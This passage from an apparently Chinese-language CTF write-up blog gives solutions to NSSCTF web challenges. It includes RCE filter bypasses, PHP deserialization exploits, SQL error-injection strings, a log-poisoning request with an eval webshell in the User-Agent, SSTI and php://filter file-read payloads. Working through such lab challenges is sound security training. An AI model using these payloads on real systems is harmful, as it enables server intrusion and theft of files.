class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br><span class="line"><span class="comment">#输入内容：&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="85-NISACTF-2022-middlerce"><a href="#85-NISACTF-2022-middlerce" class="headerlink" title="85.[NISACTF 2022]middlerce"></a>85.[NISACTF 2022]middlerce</h1><p>PRCE回溯绕过限制；使用反引号执行命令，短标签执行php。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`tail /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27;</span> + <span class="string">&quot;$&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28713/&quot;</span>, data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h1 id="86-SWPUCTF-2022-新生赛-1z-unserialize"><a href="#86-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="86.[SWPUCTF 2022 新生赛]1z_unserialize"></a>86.[SWPUCTF 2022 新生赛]1z_unserialize</h1><p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O:3:&quot;lyh&quot;:2:&#123;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:9:&quot;cat /flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="87-SWPUCTF-2022-新生赛-numgame"><a href="#87-SWPUCTF-2022-新生赛-numgame" class="headerlink" title="87.[SWPUCTF 2022 新生赛]numgame"></a>87.[SWPUCTF 2022 新生赛]numgame</h1><p>call_user_func的要点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1.调用函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">a</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&#x27;A::b&#x27;</span>);</span><br><span class="line"><span class="comment">//另一种形式</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;b&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.对call_user_func使用类方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;B::c&#x27;</span>);</span><br><span class="line"><span class="comment">//另一种形式</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$b</span>, <span class="string">&#x27;c&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>F12查看1.js发现<code> NSSCTF&#123;TnNTY1RmLnBocA==&#125;</code>，内容解b64得到NsScTf.php，根据提示访问hint2.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有没有一种可能，类是nss2</span><br></pre></td></tr></table></figure>

<p>hint1可以使用post传参</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">p=nss2::ctf</span><br></pre></td></tr></table></figure>

<h1 id="88-HUBUCTF-2022-新生赛-HowToGetShell"><a href="#88-HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="88.[HUBUCTF 2022 新生赛]HowToGetShell"></a>88.[HUBUCTF 2022 新生赛]HowToGetShell</h1><p>无字母getshell，构造phpinfo</p>
<p>payload:<code>mess=$_=(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;);$_();</code></p>
<p>相当于先执行$_&#x3D;phpinfo然后调用<code>$_();  -&gt; phpinfo();</code></p>
<h1 id="89-NISACTF-2022-join-us"><a href="#89-NISACTF-2022-join-us" class="headerlink" title="89.[NISACTF 2022]join-us"></a>89.[NISACTF 2022]join-us</h1><p><code>tt=1&#39;a()#</code>回显<code>FUNCTION sqlsql.a does not exist</code>报错得到数据库名为sqlsql</p>
<p>extractvalue()没有被禁用，使用报错注入</p>
<p><code>1&#39;||extractvalue(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like(&#39;sqlsql&#39;))))#</code></p>
<p>回显<code>XPATH syntax error: &#39;~Fal_flag,output&#39;</code>，即有<code>Fal_flag</code>和<code>output</code>两个表</p>
<p>column被禁用时使用join绕过</p>
<p><code>1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b) c)))#</code></p>
<p>回显<code>Duplicate column name &#39;data&#39;</code></p>
<p><code>1&#39;||extractvalue(0,concat(0x7e,(select data from output)))#</code></p>
<p>回显<code>XPATH syntax error: &#39;~NSSCTF&#123;28285739-bad7-4970-8d...&#39;</code></p>
<p>mid拼后半段<code>1&#39;||extractvalue(0,concat(0x7e,mid((select data from output),20,60)))#</code></p>
<h1 id="90-NSSRound-4-SWPU-1zweb"><a href="#90-NSSRound-4-SWPU-1zweb" class="headerlink" title="90.[NSSRound#4 SWPU]1zweb"></a>90.[NSSRound#4 SWPU]1zweb</h1><p>直接查询&#x2F;flag</p>
<h1 id="91-SWPUCTF-2022-新生赛-where-am-i"><a href="#91-SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="91.[SWPUCTF 2022 新生赛]where_am_i"></a>91.[SWPUCTF 2022 新生赛]where_am_i</h1><p>flag in &#x2F;ending.php</p>
<h1 id="92-SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#92-SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="92.[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>92.[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1><p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="string">&#x27;fllllllag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;绕过__wakeup</span></span><br><span class="line"><span class="comment">//O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="93-GDOUCTF-2023"><a href="#93-GDOUCTF-2023" class="headerlink" title="93.[GDOUCTF 2023]"></a>93.[GDOUCTF 2023]<ez_ze></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install fenjing</span><br><span class="line">python3 -m fenjing webui</span><br></pre></td></tr></table></figure>

<p>焚靖CTFssti通杀</p>
<h1 id="94-HNCTF-2022-WEEK2-easy-include"><a href="#94-HNCTF-2022-WEEK2-easy-include" class="headerlink" title="94.[HNCTF 2022 WEEK2]easy_include"></a>94.[HNCTF 2022 WEEK2]easy_include</h1><p>nginx可通过UA传一句话，访问日志文件触发木马，nginx的日志位置：<code>/var/log/nginx/access.log</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log&amp;cmd=system(&#x27;cat /ffflllaaaggg&#x27;); HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:28665</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h1 id="95-SWPUCTF-2021-新生赛-hardrce-3"><a href="#95-SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="95.[SWPUCTF 2021 新生赛]hardrce_3"></a>95.[SWPUCTF 2021 新生赛]hardrce_3</h1><p>自增payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>不知道为什么写马写不进去，用这个直接读flag就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="96-SWPUCTF-2022-新生赛-js-sign"><a href="#96-SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="96.[SWPUCTF 2022 新生赛]js_sign"></a>96.[SWPUCTF 2022 新生赛]js_sign</h1><p>F12，敲击码<code>33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15</code>去除空格</p>
<p>反查解码</p>
<p><code>3343431344215434452124331421311122125444113513341415</code></p>
<p><code>NSSCTF&#123;youfindflagbytapcode&#125;</code></p>
<h1 id="97-HNCTF-2022-WEEK2-ez-SSTI"><a href="#97-HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="97.[HNCTF 2022 WEEK2]ez_SSTI"></a>97.[HNCTF 2022 WEEK2]ez_SSTI</h1><p>焚靖一把梭，flag就在当前目录下</p>
<h1 id="98-GDOUCTF-2023-反方向的钟"><a href="#98-GDOUCTF-2023-反方向的钟" class="headerlink" title="98.[GDOUCTF 2023]反方向的钟"></a>98.[GDOUCTF 2023]反方向的钟</h1><p>construct可以自己重写的</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster =<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后使用php原生类SplFileObject执行文件读取<code>a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="99-SWPUCTF-2022-新生赛-xff"><a href="#99-SWPUCTF-2022-新生赛-xff" class="headerlink" title="99.[SWPUCTF 2022 新生赛]xff"></a>99.[SWPUCTF 2022 新生赛]xff</h1><p>X-Forwarded-For: 127.0.0.1</p>
<p>Referer: index.php</p>
<h1 id="100-MoeCTF-2022-baby-file"><a href="#100-MoeCTF-2022-baby-file" class="headerlink" title="100.[MoeCTF 2022]baby_file"></a>100.[MoeCTF 2022]baby_file</h1><p>payload:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="101-CISCN-2019初赛-Love-Math"><a href="#101-CISCN-2019初赛-Love-Math" class="headerlink" title="101.[CISCN 2019初赛]Love Math"></a>101.[CISCN 2019初赛]Love Math</h1><p>二次传参rce</p>
<p>16进制只能构造到字母f，36进制可以构造所有的字母。</p>
<p>dechex：把10进制转换成16进制，_GET的16进制是<code>5F474554</code>，转换成10进制是<code>1598506324</code></p>
<p>base_convert(num,10,36)把10进制转换成36进制</p>
<p>16进制转换成字符串，需要hex2bin函数</p>
<p>使用base_convert构造出hex2bin，hex2bin作为36进制的数，转换为10进制是<code>37907361743</code></p>
<p><code>base_convert(37907361743,10,36)(dechex(1598506324))</code></p>
<p>得到的结果就是<code>_GET</code></p>
<p>使用变量pi来保存base_convert的结果，形式是$pi</p>
<p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p>
<p>编译一下，?c&#x3D;$pi&#x3D;_GET;</p>
<p>那么$$pi就是$_GET</p>
<p>$$pi{pi}就是$_GET{pi}也就是$_GET[pi]</p>
<p>那么<code>$$pi&#123;pi&#125;($$pi&#123;abs&#125;)</code>也就是最上面的<code>$_GET[1]($_GET&#123;2&#125;)</code>，1和2在本题会被过滤，使用合法的代号<code>pi</code>和<code>abs</code>，尽量选择短的，因为payload长度不能超过80</p>
<h1 id="102-NSSRound-8-Basic-MyDoor"><a href="#102-NSSRound-8-Basic-MyDoor" class="headerlink" title="102.[NSSRound#8 Basic]MyDoor"></a>102.[NSSRound#8 Basic]MyDoor</h1><p>文件读取flag.php失败，尝试读取index.php如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php的特性，N[S.S会解析成N_S.S</p>
<p>payload:<code>?N[S.S=phpinfo();&amp;file=1</code></p>
<h1 id="103-prize-p5"><a href="#103-prize-p5" class="headerlink" title="103.prize_p5"></a>103.prize_p5</h1><p>非预期：SplFileObject绕过waf，类大小写不敏感(改为大写S)</p>
<p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileOb\6Aect&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p><code>?cata=O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileOb\6Aect&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>
<p>预期：序列化字符串逃逸</p>
<p><code>name=test&amp;phone[]=NSS&amp;email=test</code></p>
<p><code>O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;s:3:&quot;hacker&quot;;&#125;s:5:&quot;email&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>目标：<code>&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code>，一共28个字符，就需要使用hello触发waf的替换，hello变hacker，就可以多一个字符出来了，要28个hello</p>
